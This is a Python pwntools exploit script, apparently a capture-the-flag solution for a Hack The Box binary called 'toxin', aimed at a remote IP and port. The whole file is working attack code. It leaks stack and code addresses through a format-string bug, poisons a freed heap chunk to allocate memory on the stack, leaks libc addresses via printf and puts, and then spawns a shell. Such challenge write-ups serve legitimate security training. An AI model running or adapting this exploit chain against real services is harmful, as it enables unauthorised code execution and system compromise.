import ipaddress
import pathlib
import re
import string
from core.gdb_wrapper import GdbWrapper
from core.generic_pwn import GenericPwn
from core.target_config import Config, Mode
from core.targetbase import TargetBase
from pwn import p64, u64

from modules.exec_shell import ExecShell
from modules.get_libc_address import GetLibcAddress


class ToxinPwn(GenericPwn):
    @classmethod
    def create_toxin(cls, index: int, size: int, data: bytes):
        cls.logger.info(t.process.recvuntil(b">").decode(), "1")
        t.process.sendline(b"1")
        cls.logger.info(t.process.recvuntil(b":").decode() + hex(size))
        t.process.sendline(str(size).encode())
        cls.logger.info(t.process.recvuntil(b":").decode() + hex(index))
        t.process.sendline(str(index).encode())
        cls.logger.info(t.process.recvuntil(b":").decode())
        cls.logger.info(data)
        t.process.sendline(data)

    @classmethod
    def search_toxin(cls, data: bytes):
        cls.logger.info(t.process.recvuntil(b">").decode() + "4")
        t.process.sendline(b"4")
        cls.logger.info(t.process.recvuntil(b":").decode())
        cls.logger.info(data)
        t.process.sendline(data)
        result = t.process.recvuntil((b"!", b".")).decode()
        cls.logger.info(result)
        return result

    @classmethod
    def free_toxin(cls, index: int):
        cls.logger.info(t.process.recvuntil(b">").decode() + "3")
        t.process.sendline(b"3")
        cls.logger.info(t.process.recvuntil(b":").decode() + hex(index))
        t.process.sendline(str(index).encode())

    @classmethod
    def edit_toxin(cls, index: int, data: bytes):
        cls.logger.info(t.process.recvuntil(b">").decode() + "2")
        t.process.sendline(b"2")
        cls.logger.info(t.process.recvuntil(b":").decode() + hex(index))
        t.process.sendline(str(index).encode())
        cls.logger.info(t.process.recvuntil(b":").decode())
        t.process.clean(0.2)
        cls.logger.info(data)
        t.process.sendline(data)

    @classmethod
    def read_stack(cls, pos: int=0):
        data = f"%{pos}$p"
        result = cls.search_toxin(data.encode())
        match = re.search(f'(0x[{string.hexdigits}]+)', result)
        cls.logger.info(result)
        if match:
            return match[1]
        return None


if __name__ == '__main__':
    config = Config(
        rop=True,
        mode=Mode.remote,
        ip=ipaddress.IPv4Address('188.166.144.53'),
        port=32425,
        file=pathlib.Path('/home/lim8en1/htb/projects/toxin/toxin'),
        detect_libc=True,
        offset=0x10
    )

    signatures = (b'\xDE', b'\xC0', b'\xCA')
    max_allocate_size = 0xE0
    t = TargetBase(pwn_target=ToxinPwn, config=config)
    ret_address = int(t.pwn_target.read_stack(1), 16) + 0x6 - 0x10 # stack frame base
    main_address = int(t.pwn_target.read_stack(9), 16) - 207  # main address
    t.logger.success(f"main@{hex(main_address)}")
    t.update_base_address(main_address - t.file.symbols['main'])
    t.pwn_target.create_toxin(0, 0xE0, data=b'\xDE\xAD\xBE\xEF\0')
    t.pwn_target.free_toxin(0)
    t.logger.info(f"Trying to allocate memory on stack {hex(ret_address)}")
    t.pwn_target.edit_toxin(0, p64(ret_address))

    result = t.pwn_target.edit_toxin(0, p64(ret_address))
    t.pwn_target.create_toxin(1, 0xE0, data=b'\xDE\xAD\xBE\xEF\0')
    t.pwn_target.create_toxin(2, 0xE0, data=b'\xDE\xAD\xBE\xEF\0')
    printf_address = GetLibcAddress.execute(t, target_functions=["printf"], handler=lambda target, payload: target.pwn_target.edit_toxin(2, payload))
    puts_address = GetLibcAddress.execute(t, target_functions=["puts"], handler=lambda target, payload: target.pwn_target.edit_toxin(2, payload))
    if GetLibcAddress.libc_update_base_address(target=t, functions=[("puts", puts_address), ("printf", printf_address)]):
        ExecShell.execute(target=t, handler=lambda target, payload: target.pwn_target.edit_toxin(2, payload))
